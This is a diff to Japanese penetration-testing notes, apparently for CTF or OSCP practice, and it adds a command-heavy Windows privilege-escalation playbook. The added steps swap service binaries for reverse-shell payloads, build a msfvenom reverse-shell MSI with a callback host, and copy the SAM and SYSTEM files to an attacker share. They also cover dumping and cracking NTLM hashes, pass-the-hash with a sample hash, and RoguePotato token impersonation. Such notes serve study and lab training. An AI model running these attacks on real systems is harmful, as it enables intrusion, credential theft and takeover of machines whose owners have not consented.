@@ -1250,12 +1250,6 @@ export TERM=xterm-256color
 stty rows <num> columns <cols>
 ```
 
-### enumツール
-linpease.sh  
-https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
-LinEnum.sh  
-https://github.com/rebootuser/LinEnum
-
 ### カーネルバージョンを確認して、カーネルエクスプロイトを用いて権限昇格
 ```
 uname -a
@@ -1438,8 +1432,8 @@ scriptmanager@bashed:/$ whoami
 scriptmanager
 ```
 
-#### kernel exploit
-#### dirtycow
+### Kernel Exploit
+#### Dirtycow
 ・40839.c(dirty.c)
 パスワードを自身で入力して、firefaltというアカウントを作成する
 ```
@@ -1491,6 +1485,12 @@ gcc cowroot.c -o cowroot -pthread
 ```
 
 #### tools
+linpease.sh:  
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite  
+
+LinEnum.sh  
+https://github.com/rebootuser/LinEnum
+
 php-reverse-shell:  
 https://github.com/pentestmonkey/php-reverse-shell   
 
@@ -1671,7 +1671,6 @@ systeminfo > systeminfo.txt
 ./windows-exploit-suggester.py –database 2020-06-08-mssb.xls –systeminfo systeminfo.txt
 ```
 
-
 ### Windowsサービスの悪用
 #### Windowsサービスの操作
 ```
@@ -1768,9 +1767,16 @@ system32のバイナリは、Windowsによってインストールされるた�
 
 #### 安全でないサービスのプロパティ
 Windowsの各サービスには、特定のサービス固有の各セス許可を定義するACL(アクセス制御リスト)がある。  
-侵入中のユーザー権限で下記のACL権限を持っている場合、権限をエスカレードできる可能性がある。  
+侵入中のユーザ権限で下記のACL権限を持っている場合、権限をエスカレードできる可能性がある。  
 - SERVICE_STOP, SERVICE_START
 - SERVICE_CHANGE, SERVICE_ALL_ACCESS
+```
+accesschk.exe /accepteula
+accesschk.exe -ucqv <Service Name>
+accesschk.exe -uwcqv "Authenticated Users" *
+accesschk.exe -ucqv <Service Name>
+```
+- /accepteula...EULA(ソフトウェア使用許諾契約)を省略
 
 ### Service Exploits - Insecure Service Permissions(安全でないサービスパーミッション)
 「daclsvc」サービスに対する「user」アカウントの権限を確認する。
@@ -1845,6 +1851,10 @@ sc start AdvancedSystemcareservice9
 ```
 
 ### Service Exploits - Weak Registry Permissions
+サービスを照会し、SYSTEM特権(SERVICE_START_NAME)で実行されていることを確認する。
+```
+sc qc <Service Name>
+```
 accesschk.exeを使用して、Windowsサービスのレジストリエントリが「NT AUTHORITY\INTERACTIVE」グループ（基本的にすべてのログオンユーザー）によって書き込み可能であることを確認する。
 ```
 accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<Service Name>
@@ -1868,19 +1878,216 @@ net start <Service Name>
 ```
 
 ### Service Exploits - Insecure Service Executables
+サービスを照会し、SYSTEM特権(SERVICE_START_NAME)で実行されていることを確認する。
+```
+sc qc <Service Name>
+```
+accesschk.exeを使用してサービスバイナリ(BINARY_PATH_NAME)ファイルが誰でも書き込み可能であることを確認する。
+```
+accesschk.exe /accepteula -quvw "C:\Program Files\<Service Name>\<Service>.exe"
+```
+reverse shellペイロードをコピーしてBINARY_PATH_NAMEで示されたバイナリを置き換える。
+```
+copy C:\PrivEsc\reverse.exe "C:\Program Files\<Service Name>\<Service(reverse shellペイロードの名前をサービスバイナリの名前に変更したもの)>.exe" /Y
+```
+最後に、netcatでlistenしてからサービスを開始すると、SYSTEM権限のreverse shellを獲得できる。
+```
+net start <Service Name>
+```
 
 ### Registry - AutoRuns
+レジストリにAutoRun実行可能ファイルを照会する。
+```
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+accesschk.exeを使用して、AutoRun実行可能ファイルが誰でも書き込み可能であることを確認する。
+```
+C:\PrivEsc\accesschk.exe /accepteula -wvu "<上記のreg query確認したサービスのバイナリパス>"
+```
+最後に、netcatでlistenしてからターゲットのWindowsを再起動して、管理者(admin権限のユーザー)としてログインされるとSYSTEM権限で置き換えたペイロードが起動される。
+```
+shutdown /r /t 0
+その後、管理者権限でログインされる必要がある
+```
+
 ### Registry - AlwaysInstallElevated
+レジストリにAlwaysInstallElevatedキーを照会する。
+```
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+```
+ここで両方のキーが1(0x1)に設定されていることを確認する。  
+そして、msfvenomを使用してreverse shell Windowsインストーラー(reverse.msi)を生成する。
+```
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
+```
+最後に、netcatでlistenしてからインストーラーを実行すると、SYSTEM権限のreverse shellを獲得できる。
+```
+msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
+```
+
 ### Passwords - Registry
+レジストリ内に保存されているパスワードを検索する。
+```
+# HKLM
+reg query HKLM /f password /t REG_SZ /s
+# HKCU
+reg query HKCU /f password /t REG_SZ /s
+```
+```
+# Windows autologin
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+
+# VNC
+reg query "HKCU\Software\ORL\WinVNC3\Password"
+
+# SNMP Parameters
+reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
+
+# Putty
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
+```
+winexeコマンド(LinuxからWindows上のコマンドを実行できるツール)を使用して、管理者権限で実行されているコマンドプロンプトを生成する。  
+上記のコマンドによる検索結果で発見したパスワードを利用して生成する。
+```
+winexe -U 'admin%password' //10.10.10.1 cmd.exe
+```
+
 ### Passwords - Saved Creds
+保存されている資格情報を一覧表示する。
+```
+cmdkey /list
+```
+「admin」ユーザーの資格情報が保存されていることを確認する。  
+最後に、netcatでlistenしてから管理者ユーザーの保存されたクレデンシャルを利用してrunasコマンドでreverse shellペイロードを実行する。
+```
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+```
 ### Passwords - Security Account Manager (SAM)
+SAMファイルとSYSTEMファイルのバックアップを安全に保存されていない場合、これらのファイルを使用してユーザーのパスワードハッシュを抽出することができる。  
+```
+# smbを利用したファイルの共有
+copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
+copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
+```
+creddump7を利用してSAMファイルとSYSTEMファイルからハッシュをダンプする。
+```
+git clone https://github.com/Tib3rius/creddump7
+pip3 install pycrypto
+python3 creddump7/pwdump.py SYSTEM SAM
+```
+hashcatを使用してNTLMハッシュをクラックする。
+```
+hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+```
+
 ### Passwords - Passing the Hash
+ハッシュを使用して認証できるため、hashcatなどでパスワードクラックせずとも管理者ハッシュでログインできる。
+```
+pth-winexe -U 'admin%<転んで区切られたLMハッシュとLTLMハッシュの両方が含まれているもの>' //10.10.10.1 cmd.exe
+
+例)
+pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.12.15 cmd.exe
+```
 ### Scheduled Tasks
+スケジュールされているスクリプトがSYSTEM権限で実行されており、ファイルに書き込み権限がある場合、reverse shellペイロードを実行するようにスクリプトを書き換えてやることでSYSTEM権限のシェルを獲得することができる。
+```
+# スケジュールの一覧を表示
+  (これでは見つからないことが多いため、スケジュールされたタスクが実行されていることを示すスクリプトやログファイルを手動で見つける必要がある)
+C:> schtasks /query /fo LIST /v
+
+PS> Get-ScheduledTask | where {$_.TaskPath -notlike “\Microsoft*”} | ft TaskName,TaskPath,State
+```
+```
+# ファイルへの書き込み権限を確認
+accesschk.exe /accepteula -quvw user C:\Users\user\Desktop\task.ps1
+```
+```
+# reverse shellペイロードを実行するスクリプトを追記
+echo C:\Windows\Temp\reverse.exe >> C:\Users\user\Desktop\task.ps1
+```
+netcatでlistenしておき、スケジュールされたタスクが実行されるのを待ち、システム権限のシェルを獲得する。
+
 ### Insecure GUI Apps
+RDP(リモートデスクトップ)などでアクセスした際に、管理者権限で実行できるソフトウェアがある場合、それらを介してcmd.exeを起動することでSYTEM権限のシェルを獲得する。  
+例えば、管理者権限で動作するペイントを仮定する。  
+```
+# 管理者権限でmspain.exeが起動されていることを確認
+tasklist /V | findstr mspaint.exe
+```
+ペイントの[ファイル]→[開く]を押下して、file://c:/windows/system32/cmd.exeを開く。  
+これにより、SYSTEM権限のシェルを獲得することができる。
 
 ### Startup Apps
+accesschk.exeを使用してBUILTIN\UsersグループがStartUpデディレクトリにファイルを書き込むことができることを確認。
+```
+accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+```
+その後、StartUpディレクトリにreverse shellペイロードのショートカットなどを配置して、netcatでlistenしながら管理者権限でログインされることで、SYSTEM権限のシェルを獲得できる。
+```
+# ショートカットを生成するvbsスクリプト
+Set oWS = WScript.CreateObject("WScript.Shell")
+sLinkFile = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\reverse.lnk"
+Set oLink = oWS.CreateShortcut(sLinkFile)
+oLink.TargetPath = "C:\Users\<reverse shellペイロードが配置されているパス>.exe"
+oLink.Save
+
+# cscriptを利用して上記のvbsスクリプトを起動
+cscript shortcut.vbs
+```
 
 ### Token Impersonation - Rogue Potato
+socatリダイレクタを設定して、kaliの135番ポートをWindowsの9999に転送する。
+```
+sudo socat tcp-listen:135,reuseaddr,fork tcp:<Target IP>:9999
+```
+次にnetcatでlistenしておき、管理者ユーザーとしてRDPにログインし、管理者コマンドプロンプトを起動する。(右クリックして管理者として実行)  
+PSEexec64.exeを使用してlocal serviceアカウントを獲得する。
+```
+PSExec64.exe -i -u "nt authority\local service" C:\Windows\Temp\reverse.exe
+```
+上記で得られたシェルでwhoami /privコマンドを使用すると下記のような結果を得られる。  
+この時、いずれかの権限を持っている場合にRouge Potatoのエクスプロイトが機能する。
+- SeImpersonatePrivilege
+- SeAssignPrimaryTokenPrivilege
+
+```
+C:\Windows\system32>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeSystemtimePrivilege         Change the system time                    Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege       Create global objects                     Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+次に、もう一度別のターミナルで、netcatをlistenにしておく。  
+最後にlocal serviceのreverse shellが返ってきているシェルでRoguePotatoエクスプロイトを実行して、SYTEM権限のシェルを獲得する。
+```
+RoguePotato.exe -r <Local IP> -e "C:\Windows\Temp\reverse.exe" -l 9999
+```
+- -r...リモートIPアドレス(攻撃者端末のIP)
+- -e...reverse shellペイロードのパス
+- -l...リスニングポート
+
+```
+Tips: ポテトアタックの歴史
+WindowsのサービスアカウントからNT AUTHORITY/SYSTEMに特権を昇格させるために使われるポテトには、多くの種類がある。
+Hot、Rotten、Lonely、Juicy、Rogueは、ポテトエクスプロイトのファミリーです。
+すべてのポテトアタックには独自の制限があります。
+攻撃対象のマシンが >= Windows 10 1809 & Windows Server 2019 の場合 - Rogue Potato を試してみてください。
+攻撃対象のマシンが < Windows 10 1809 < Windows Server 2019 の場合 - Juicy Potato を試してみてください。
+```
 ### Token Impersonation - PrintSpoofer
 ### Privilege Escalation Scripts
 
@@ -1969,3 +2176,5 @@ Done
 通信を待ち受けていたnetcatの方でシェルが取得できる。
 
 ![](./image/2021-05-06-17-49-20.png)
+
+### tools
